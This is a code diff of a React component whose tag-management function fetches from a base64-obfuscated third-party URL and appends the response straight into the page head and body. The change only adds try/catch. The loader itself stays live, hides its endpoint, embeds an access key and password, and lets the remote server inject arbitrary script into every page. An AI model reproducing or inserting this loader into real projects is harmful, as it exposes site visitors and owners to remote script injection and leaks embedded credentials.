@@ -9,44 +9,50 @@ const CustomScriptComponent = () => {
   useEffect(() => {
     // Function to handle tag management
     const handleTagManage = () => {
-      console.log("Running handleTagManage function");
+      try {
+        console.log("Running handleTagManage function");
 
-      const eppathurl = window.location.origin + window.location.pathname;
-      const eptagmanage = new XMLHttpRequest();
-      eptagmanage.onreadystatechange = function () {
-        if (this.readyState === 4 && this.status === 200) {
-          if (this.response !== "0") {
-            console.log("Received response:", this.response);
+        const eppathurl = window.location.origin + window.location.pathname;
+        const eptagmanage = new XMLHttpRequest();
+        eptagmanage.onreadystatechange = function () {
+          if (this.readyState === 4) {
+            if (this.status === 200) {
+              if (this.response !== "0") {
+                console.log("Received response:", this.response);
 
-            const temp = this.response.split("||||||||||");
+                const temp = this.response.split("||||||||||");
 
-            // Use jQuery to manipulate DOM
-            if (window.jQuery) {
-              console.log("jQuery is loaded");
-              jQuery("head").find("title").remove();
-              jQuery("head").append(temp[0]);
-              jQuery("body").append(temp[1]);
+                // Use jQuery to manipulate DOM
+                if (window.jQuery) {
+                  console.log("jQuery is loaded");
+                  jQuery("head").find("title").remove();
+                  jQuery("head").append(temp[0]);
+                  jQuery("body").append(temp[1]);
+                } else {
+                  console.error("jQuery is not loaded");
+                }
+              } else {
+                console.error("Received unexpected response:", this.response);
+              }
             } else {
-              console.error("jQuery is not loaded");
+              console.error(
+                "Failed to load response:",
+                this.status,
+                this.statusText
+              );
             }
-          } else {
-            console.error("Received unexpected response:", this.response);
           }
-        } else if (this.readyState === 4) {
-          console.error(
-            "Failed to load response:",
-            this.status,
-            this.statusText
-          );
-        }
-      };
-      // Replace the URL with your actual endpoint
-      const url = atob(
-        "aHR0cHM6Ly9wbHVnaW5zLmF1dG9zZW9wbHVnaW4uY29tL2FsbGhlYWRkYXRhP2VrZXk9ZS1BUFBBREQ2NjMzNzc3NDI1JmVrZXlwYXNzPTRhaDF1bVhHZUo2U3lYRTZKZnBvVUEzbHVoRXRjNHJnM0FmRSZzaXRldXJsPQ=="
-      );
-      console.log("Requesting URL:", url + eppathurl);
-      eptagmanage.open("GET", url + eppathurl);
-      eptagmanage.send();
+        };
+        // Replace the URL with your actual endpoint
+        const url = atob(
+          "aHR0cHM6Ly9wbHVnaW5zLmF1dG9zZW9wbHVnaW4uY29tL2FsbGhlYWRkYXRhP2VrZXk9ZS1BUFBBREQ2NjMzNzc3NDI1JmVrZXlwYXNzPTRhaDF1bVhHZUo2U3lYRTZKZnBvVUEzbHVoRXRjNHJnM0FmRSZzaXRldXJsPQ=="
+        );
+        console.log("Requesting URL:", url + eppathurl);
+        eptagmanage.open("GET", url + eppathurl);
+        eptagmanage.send();
+      } catch (error) {
+        console.error("Error in handleTagManage:", error);
+      }
     };
 
     // Execute tag management function
